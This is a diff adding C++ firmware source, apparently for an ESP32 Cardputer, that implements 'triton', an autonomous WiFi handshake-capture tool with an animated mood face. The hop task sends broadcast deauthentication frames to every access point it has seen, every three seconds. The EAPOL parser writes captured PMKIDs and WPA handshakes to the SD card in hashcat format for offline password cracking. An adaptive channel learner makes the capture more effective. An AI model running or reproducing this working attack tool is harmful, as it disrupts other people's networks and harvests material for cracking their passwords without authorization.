@@ -1,0 +1,535 @@
+/*
+ * triton — autonomous handshake hunter with personality.
+ *
+ * Poseidon's son runs the capture task in the background and shows a
+ * little ASCII face with a mood that reflects how well he's hunting.
+ *
+ * Under the hood:
+ *   - Background FreeRTOS task: channel-hop promisc, EAPOL parse,
+ *     hashcat 22000 writer (same logic as wifi_pmkid). Hunt mode
+ *     is ALWAYS on — broadcast-deauths every seen BSSID every 3s.
+ *   - Mood state machine drives the face + one-line thought bubble.
+ *
+ * Moods:
+ *   SLEEPY   — just started, no captures yet
+ *   HUNTING  — actively stalking, no catches yet but >30s in
+ *   HUNGRY   — a while with no new catches
+ *   STOKED   — just grabbed one, celebratory face for 5s
+ *   HUNGRY2  — 5 min dry spell, starting to give up
+ *   FERAL    — 10+ captures stacked, unhinged energy
+ */
+#include "app.h"
+#include "ui.h"
+#include "input.h"
+#include "radio.h"
+#include <WiFi.h>
+#include <esp_wifi.h>
+#include <SD.h>
+
+static volatile uint32_t s_pmk   = 0;
+static volatile uint32_t s_hs    = 0;
+static volatile uint32_t s_eapol = 0;
+static volatile uint32_t s_last_catch = 0;
+static volatile uint32_t s_born = 0;
+static volatile uint8_t  s_ch    = 1;
+static volatile bool     s_alive = false;
+static File              s_file;
+
+/* ---- adaptive learning (lightweight RL) ----
+ * Per-channel value estimate. Each successful capture on channel c
+ * bumps s_q[c]; hop task weights dwell time by softmax of these values.
+ * Persisted to SD so Triton gets smarter across power cycles.
+ */
+#define NCH 14  /* indices 1..13 used */
+static float s_q[NCH];          /* running value */
+static uint32_t s_visits[NCH];  /* times we've dwelled on this ch */
+static uint32_t s_wins[NCH];    /* captures made while on this ch */
+
+static void triton_learn_load(void)
+{
+    for (int i = 0; i < NCH; ++i) {
+        s_q[i] = 0.5f;  /* neutral prior */
+        s_visits[i] = 0;
+        s_wins[i] = 0;
+    }
+    File f = SD.open("/poseidon/triton_brain.bin", FILE_READ);
+    if (f && f.size() == (int)(sizeof(s_q) + sizeof(s_visits) + sizeof(s_wins))) {
+        f.read((uint8_t *)s_q, sizeof(s_q));
+        f.read((uint8_t *)s_visits, sizeof(s_visits));
+        f.read((uint8_t *)s_wins, sizeof(s_wins));
+    }
+    if (f) f.close();
+}
+
+static void triton_learn_save(void)
+{
+    File f = SD.open("/poseidon/triton_brain.bin", FILE_WRITE);
+    if (!f) return;
+    f.write((const uint8_t *)s_q, sizeof(s_q));
+    f.write((const uint8_t *)s_visits, sizeof(s_visits));
+    f.write((const uint8_t *)s_wins, sizeof(s_wins));
+    f.close();
+}
+
+/* Reward the currently-active channel whenever a capture lands. */
+static void triton_reward(uint8_t ch)
+{
+    if (ch < 1 || ch > 13) return;
+    const float alpha = 0.2f;       /* learning rate */
+    s_q[ch] += alpha * (1.0f - s_q[ch]);
+    s_wins[ch]++;
+}
+
+/* Pick the next channel: 80% softmax by learned value, 20% random
+ * exploration so dead channels still get periodic probes. */
+static uint8_t triton_pick_channel(void)
+{
+    if ((esp_random() & 0xFF) < 51) {
+        return 1 + (esp_random() % 13);
+    }
+    float total = 0;
+    for (int i = 1; i <= 13; ++i) total += s_q[i] + 0.05f;
+    float r = ((float)(esp_random() & 0xFFFF) / 65536.0f) * total;
+    float acc = 0;
+    for (int i = 1; i <= 13; ++i) {
+        acc += s_q[i] + 0.05f;
+        if (r <= acc) return (uint8_t)i;
+    }
+    return 1 + (esp_random() % 13);
+}
+
+/* Cache: BSSID -> SSID (from beacons) so handshakes get real ESSID. */
+struct bs_t { uint8_t bssid[6]; char ssid[33]; };
+#define BS_N 24
+static bs_t s_bs[BS_N];
+static volatile int s_bs_n = 0;
+
+/* Pending M1 for (BSSID, STA) pair awaiting M2. */
+struct m1_t {
+    uint8_t bssid[6], sta[6], anonce[32];
+    uint8_t m1_eapol[256];
+    int     m1_len;
+    uint32_t ts;
+};
+#define M1_N 8
+static m1_t s_m1[M1_N];
+static volatile int s_m1_n = 0;
+
+static const char *ssid_of(const uint8_t *b)
+{
+    for (int i = 0; i < s_bs_n; ++i)
+        if (memcmp(s_bs[i].bssid, b, 6) == 0) return s_bs[i].ssid;
+    return "";
+}
+
+static void hexcat(char *dst, const uint8_t *src, int n)
+{
+    int o = strlen(dst);
+    for (int i = 0; i < n; ++i) o += sprintf(dst + o, "%02x", src[i]);
+}
+
+static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t *sta)
+{
+    if (!s_file) return;
+    const char *ssid = ssid_of(bssid);
+    char line[300] = "WPA*01*";
+    hexcat(line, pmkid, 16); strcat(line, "*");
+    hexcat(line, bssid, 6);  strcat(line, "*");
+    hexcat(line, sta, 6);    strcat(line, "*");
+    for (size_t i = 0; i < strlen(ssid); ++i) {
+        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
+        strcat(line, h);
+    }
+    strcat(line, "***\n");
+    s_file.print(line);
+    s_file.flush();
+    s_pmk++;
+    s_last_catch = millis();
+    triton_reward(s_ch);
+}
+
+static void emit_hs(const uint8_t *bssid, const uint8_t *sta,
+                    const uint8_t *mic, const uint8_t *anonce,
+                    const uint8_t *m2, int m2_len)
+{
+    if (!s_file) return;
+    const char *ssid = ssid_of(bssid);
+    char line[1024] = "WPA*02*";
+    hexcat(line, mic, 16);    strcat(line, "*");
+    hexcat(line, bssid, 6);   strcat(line, "*");
+    hexcat(line, sta, 6);     strcat(line, "*");
+    for (size_t i = 0; i < strlen(ssid); ++i) {
+        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
+        strcat(line, h);
+    }
+    strcat(line, "*");
+    hexcat(line, anonce, 32); strcat(line, "*");
+    hexcat(line, m2, m2_len); strcat(line, "*02\n");
+    s_file.print(line);
+    s_file.flush();
+    s_hs++;
+    s_last_catch = millis();
+    triton_reward(s_ch);
+}
+
+static m1_t *m1_slot(const uint8_t *b, const uint8_t *s)
+{
+    for (int i = 0; i < s_m1_n; ++i)
+        if (!memcmp(s_m1[i].bssid, b, 6) && !memcmp(s_m1[i].sta, s, 6))
+            return &s_m1[i];
+    if (s_m1_n >= M1_N) {
+        int o = 0;
+        for (int i = 1; i < s_m1_n; ++i) if (s_m1[i].ts < s_m1[o].ts) o = i;
+        return &s_m1[o];
+    }
+    m1_t *e = &s_m1[s_m1_n++];
+    memcpy(e->bssid, b, 6); memcpy(e->sta, s, 6);
+    return e;
+}
+
+static void handle_eapol(const uint8_t *frame, int len)
+{
+    if (len < 40) return;
+    uint8_t fc = frame[0], type = (fc >> 2) & 3;
+    if (type != 2) return;
+    uint8_t from_ds = (frame[1] >> 1) & 1, to_ds = frame[1] & 1;
+    int hdr = 24;
+    if ((fc >> 4) & 0x8) hdr += 2;
+    if (len < hdr + 8) return;
+    const uint8_t *llc = frame + hdr;
+    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
+          llc[6] == 0x88 && llc[7] == 0x8E)) return;
+    const uint8_t *eapol = llc + 8;
+    int elen = len - (eapol - frame);
+    if (elen < 95 || eapol[1] != 0x03) return;
+
+    s_eapol++;
+
+    const uint8_t *bssid, *sta;
+    bool from_ap;
+    if (from_ds && !to_ds)      { sta = frame + 4; bssid = frame + 10; from_ap = true; }
+    else if (to_ds && !from_ds) { bssid = frame + 4; sta = frame + 10; from_ap = false; }
+    else return;
+
+    uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
+    const uint8_t *nonce = eapol + 17;
+    const uint8_t *mic = eapol + 81;
+    uint16_t kd_len = ((uint16_t)eapol[93] << 8) | eapol[94];
+    const uint8_t *kd = eapol + 95;
+
+    /* PMKID walk. */
+    if (kd_len >= 22) {
+        int off = 0;
+        while (off + 2 < kd_len) {
+            uint8_t t = kd[off], l = kd[off + 1];
+            if (off + 2 + l > kd_len) break;
+            if (t == 0xDD && l >= 20 &&
+                kd[off+2] == 0x00 && kd[off+3] == 0x0F && kd[off+4] == 0xAC && kd[off+5] == 0x04) {
+                emit_pmkid(kd + off + 6, bssid, sta);
+                break;
+            }
+            off += 2 + l;
+        }
+    }
+
+    bool mic_set     = key_info & (1 << 8);
+    bool ack_set     = key_info & (1 << 7);
+    bool install_set = key_info & (1 << 6);
+
+    if (from_ap && ack_set && !mic_set && !install_set) {
+        /* M1 */
+        m1_t *e = m1_slot(bssid, sta);
+        if (e) {
+            memcpy(e->bssid, bssid, 6);
+            memcpy(e->sta, sta, 6);
+            memcpy(e->anonce, nonce, 32);
+            int cp = elen < (int)sizeof(e->m1_eapol) ? elen : (int)sizeof(e->m1_eapol);
+            memcpy(e->m1_eapol, eapol, cp);
+            e->m1_len = cp;
+            e->ts = millis();
+        }
+    } else if (!from_ap && mic_set && !ack_set && !install_set) {
+        /* M2 */
+        m1_t *e = m1_slot(bssid, sta);
+        if (e && e->m1_len > 0) emit_hs(bssid, sta, mic, e->anonce, eapol, elen);
+    }
+}
+
+static void cache_beacon(const uint8_t *bssid, const uint8_t *tags, int len)
+{
+    if (len < 2 || tags[0] != 0 || tags[1] == 0 || tags[1] > 32) return;
+    int idx = -1;
+    for (int i = 0; i < s_bs_n; ++i)
+        if (!memcmp(s_bs[i].bssid, bssid, 6)) { idx = i; break; }
+    if (idx < 0) { if (s_bs_n >= BS_N) return; idx = s_bs_n++; memcpy(s_bs[idx].bssid, bssid, 6); }
+    memcpy(s_bs[idx].ssid, tags + 2, tags[1]);
+    s_bs[idx].ssid[tags[1]] = '\0';
+}
+
+static void cb(void *buf, wifi_promiscuous_pkt_type_t type)
+{
+    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
+    int len = pkt->rx_ctrl.sig_len;
+    if (len < 24) return;
+    if (type == WIFI_PKT_MGMT) {
+        uint8_t st = (pkt->payload[0] >> 4) & 0xF;
+        if (st == 0x8 || st == 0x5)
+            cache_beacon(pkt->payload + 16, pkt->payload + 36, len - 36 - 4);
+    } else if (type == WIFI_PKT_DATA) {
+        handle_eapol(pkt->payload, len);
+    }
+}
+
+static void hop_task(void *)
+{
+    uint8_t deauth[26] = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+        0,0,0,0,0,0, 0,0,0,0,0,0,
+        0x00, 0x00, 0x07, 0x00,
+    };
+    uint32_t last_hunt = 0;
+    uint32_t last_save = millis();
+    while (s_alive) {
+        s_ch = triton_pick_channel();
+        s_visits[s_ch]++;
+        esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
+
+        /* Every 3s do a deauth burst against every known AP on current ch. */
+        if (millis() - last_hunt > 3000 && s_bs_n > 0) {
+            last_hunt = millis();
+            for (int i = 0; i < s_bs_n && s_alive; ++i) {
+                memcpy(deauth + 10, s_bs[i].bssid, 6);
+                memcpy(deauth + 16, s_bs[i].bssid, 6);
+                for (int k = 0; k < 2; ++k) {
+                    esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
+                    delay(5);
+                }
+            }
+        }
+        /* Dwell longer on high-value channels, shorter on cold ones. */
+        int dwell_ms = 300 + (int)(s_q[s_ch] * 700);
+        delay(dwell_ms);
+
+        /* Persist learned weights every 30s so a restart keeps the brain. */
+        if (millis() - last_save > 30000) {
+            last_save = millis();
+            triton_learn_save();
+        }
+    }
+    triton_learn_save();
+    vTaskDelete(nullptr);
+}
+
+/* ---- mood + face ---- */
+
+enum mood_t { MOOD_SLEEPY, MOOD_HUNTING, MOOD_HUNGRY, MOOD_STOKED, MOOD_DESPAIR, MOOD_FERAL };
+
+static mood_t mood_now(void)
+{
+    uint32_t now = millis();
+    uint32_t age = (now - s_born) / 1000;         /* seconds since launch */
+    uint32_t dry = (now - s_last_catch) / 1000;   /* seconds since last catch */
+    uint32_t total = s_pmk + s_hs;
+
+    if (total >= 10)                 return MOOD_FERAL;
+    if (total > 0 && dry < 5)        return MOOD_STOKED;
+    if (age < 30)                    return MOOD_SLEEPY;
+    if (dry > 300)                   return MOOD_DESPAIR;
+    if (dry > 90 || total == 0)      return MOOD_HUNGRY;
+    return MOOD_HUNTING;
+}
+
+static const char *mood_word(mood_t m)
+{
+    switch (m) {
+    case MOOD_SLEEPY:  return "just waking up...";
+    case MOOD_HUNTING: return "on the hunt";
+    case MOOD_HUNGRY:  return "where are you...";
+    case MOOD_STOKED:  return "GOT ONE!";
+    case MOOD_DESPAIR: return "its too quiet";
+    case MOOD_FERAL:   return "SEND THEM ALL";
+    }
+    return "";
+}
+
+/* Five face states, drawn in a 60x40 area centered at (cx, cy). */
+static void draw_face(int cx, int cy, mood_t m, uint32_t tick)
+{
+    auto &d = M5Cardputer.Display;
+    /* head circle */
+    uint16_t skin = 0x3F5F;  /* pale cyan */
+    uint16_t outline = COL_ACCENT;
+    d.fillCircle(cx, cy, 22, skin);
+    d.drawCircle(cx, cy, 22, outline);
+    d.drawCircle(cx, cy, 21, outline);
+
+    /* crown (small trident between the eyes) */
+    d.drawFastVLine(cx, cy - 26, 8, 0xE73C);
+    d.drawFastHLine(cx - 5, cy - 24, 11, 0xE73C);
+    d.drawFastVLine(cx - 5, cy - 28, 4, 0xE73C);
+    d.drawFastVLine(cx + 5, cy - 28, 4, 0xE73C);
+
+    /* eyes vary by mood */
+    int eye_y = cy - 4;
+    int el = cx - 7, er = cx + 7;
+    switch (m) {
+    case MOOD_SLEEPY: {
+        bool blink = ((tick / 500) & 1) == 0;
+        if (blink) { d.drawFastHLine(el - 2, eye_y, 5, 0x0000); d.drawFastHLine(er - 2, eye_y, 5, 0x0000); }
+        else       { d.fillCircle(el, eye_y, 1, 0x0000); d.fillCircle(er, eye_y, 1, 0x0000); }
+        break;
+    }
+    case MOOD_HUNTING:
+        d.fillCircle(el, eye_y, 2, 0x0000);
+        d.fillCircle(er, eye_y, 2, 0x0000);
+        /* darting pupil */
+        d.drawPixel(el + (int)((tick / 200) % 3 - 1), eye_y, COL_BAD);
+        d.drawPixel(er + (int)((tick / 200) % 3 - 1), eye_y, COL_BAD);
+        break;
+    case MOOD_HUNGRY:
+        d.drawPixel(el, eye_y, 0x0000);
+        d.drawPixel(er, eye_y, 0x0000);
+        d.drawFastHLine(el - 2, eye_y + 1, 5, 0x0000);
+        d.drawFastHLine(er - 2, eye_y + 1, 5, 0x0000);
+        break;
+    case MOOD_STOKED:
+        /* ^ ^ */
+        d.drawLine(el - 3, eye_y + 1, el, eye_y - 2, COL_BAD);
+        d.drawLine(el, eye_y - 2, el + 3, eye_y + 1, COL_BAD);
+        d.drawLine(er - 3, eye_y + 1, er, eye_y - 2, COL_BAD);
+        d.drawLine(er, eye_y - 2, er + 3, eye_y + 1, COL_BAD);
+        break;
+    case MOOD_DESPAIR:
+        /* x x */
+        d.drawLine(el - 2, eye_y - 2, el + 2, eye_y + 2, 0x0000);
+        d.drawLine(el - 2, eye_y + 2, el + 2, eye_y - 2, 0x0000);
+        d.drawLine(er - 2, eye_y - 2, er + 2, eye_y + 2, 0x0000);
+        d.drawLine(er - 2, eye_y + 2, er + 2, eye_y - 2, 0x0000);
+        break;
+    case MOOD_FERAL:
+        /* wide red angry eyes */
+        d.fillCircle(el, eye_y, 3, COL_BAD);
+        d.fillCircle(er, eye_y, 3, COL_BAD);
+        d.fillCircle(el, eye_y, 1, 0xFFFF);
+        d.fillCircle(er, eye_y, 1, 0xFFFF);
+        /* angry brows */
+        d.drawLine(el - 4, eye_y - 6, el + 2, eye_y - 4, 0x0000);
+        d.drawLine(er - 2, eye_y - 4, er + 4, eye_y - 6, 0x0000);
+        break;
+    }
+
+    /* mouth varies */
+    int mx = cx, my = cy + 8;
+    switch (m) {
+    case MOOD_SLEEPY:  d.drawFastHLine(mx - 3, my, 6, 0x0000); break;
+    case MOOD_HUNTING: d.drawFastHLine(mx - 4, my, 9, 0x0000); d.drawPixel(mx, my + 1, 0x0000); break;
+    case MOOD_HUNGRY:  d.drawLine(mx - 4, my + 2, mx + 4, my, 0x0000); break;  /* downturn */
+    case MOOD_STOKED:  {
+        for (int i = 0; i <= 6; ++i) d.drawPixel(mx - 6 + i, my + (i <= 3 ? 3 - i : i - 3), 0x0000);
+        break;
+    }
+    case MOOD_DESPAIR: d.drawLine(mx - 4, my, mx + 4, my + 3, 0x0000); break;
+    case MOOD_FERAL:   {
+        /* jagged open mouth */
+        d.drawLine(mx - 5, my, mx + 5, my, 0x0000);
+        d.drawLine(mx - 5, my + 3, mx + 5, my + 3, 0x0000);
+        for (int i = -4; i <= 4; i += 2) d.drawPixel(mx + i, my + 1, 0xFFFF);
+        for (int i = -3; i <= 3; i += 2) d.drawPixel(mx + i, my + 2, 0xFFFF);
+        break;
+    }
+    }
+}
+
+void feat_triton(void)
+{
+    radio_switch(RADIO_WIFI);
+    WiFi.mode(WIFI_STA);
+
+    if (!SD.begin()) { ui_toast("SD needed", COL_BAD, 1500); return; }
+    SD.mkdir("/poseidon");
+    s_file = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
+    if (!s_file) { ui_toast("file open fail", COL_BAD, 1500); return; }
+
+    triton_learn_load();
+    s_pmk = 0; s_hs = 0; s_eapol = 0;
+    s_bs_n = 0; s_m1_n = 0;
+    s_ch = 1; s_alive = true;
+    s_born = millis();
+    s_last_catch = s_born;
+
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(cb);
+    esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
+
+    xTaskCreate(hop_task, "triton", 3072, nullptr, 4, nullptr);
+
+    ui_draw_footer("he does it himself. `=back");
+
+    uint32_t last_draw = 0;
+    uint32_t last_mood = 0;
+    mood_t   mood = MOOD_SLEEPY;
+    uint32_t stoked_until = 0;
+    uint32_t prev_total = 0;
+
+    while (true) {
+        uint32_t now = millis();
+        uint32_t total = s_pmk + s_hs;
+        if (total > prev_total) {
+            prev_total = total;
+            stoked_until = now + 5000;
+            /* tiny chime on each catch */
+            M5Cardputer.Speaker.tone(1800, 80);
+        }
+
+        if (now - last_mood > 400) {
+            last_mood = now;
+            mood = (now < stoked_until) ? MOOD_STOKED : mood_now();
+        }
+
+        if (now - last_draw > 120) {
+            last_draw = now;
+            auto &d = M5Cardputer.Display;
+            ui_clear_body();
+
+            /* Face on the left, stats on the right. */
+            draw_face(60, BODY_Y + 42, mood, now);
+
+            d.setTextColor(COL_ACCENT, COL_BG);
+            d.setCursor(118, BODY_Y + 4);
+            d.print("TRITON");
+            d.drawFastHLine(118, BODY_Y + 14, 60, COL_ACCENT);
+            d.setTextColor(COL_FG, COL_BG);
+            d.setCursor(118, BODY_Y + 18); d.printf("ch:   %u", s_ch);
+            d.setCursor(118, BODY_Y + 28); d.printf("APs:  %d", s_bs_n);
+            d.setCursor(118, BODY_Y + 38); d.printf("EAP:  %lu", (unsigned long)s_eapol);
+            d.setTextColor(s_pmk > 0 ? COL_GOOD : COL_DIM, COL_BG);
+            d.setCursor(118, BODY_Y + 48); d.printf("PMK:  %lu", (unsigned long)s_pmk);
+            d.setTextColor(s_hs > 0 ? COL_GOOD : COL_DIM, COL_BG);
+            d.setCursor(118, BODY_Y + 58); d.printf("HS:   %lu", (unsigned long)s_hs);
+
+            /* Best learned channel */
+            int best_c = 1; float best_q = s_q[1];
+            for (int i = 2; i <= 13; ++i) if (s_q[i] > best_q) { best_q = s_q[i]; best_c = i; }
+            d.setTextColor(COL_MAGENTA, COL_BG);
+            d.setCursor(118, BODY_Y + 68); d.printf("fav:  %d", best_c);
+
+            /* Mood speech bubble below the face. */
+            d.setTextColor(COL_WARN, COL_BG);
+            int ty = BODY_Y + 76;
+            const char *w = mood_word(mood);
+            d.setCursor(4, ty); d.printf("> %s", w);
+
+            ui_draw_status("wifi", "triton");
+        }
+
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(20); continue; }
+        if (k == PK_ESC) break;
+    }
+
+    s_alive = false;
+    esp_wifi_set_promiscuous(false);
+    if (s_file) { s_file.flush(); s_file.close(); }
+    delay(200);
+}
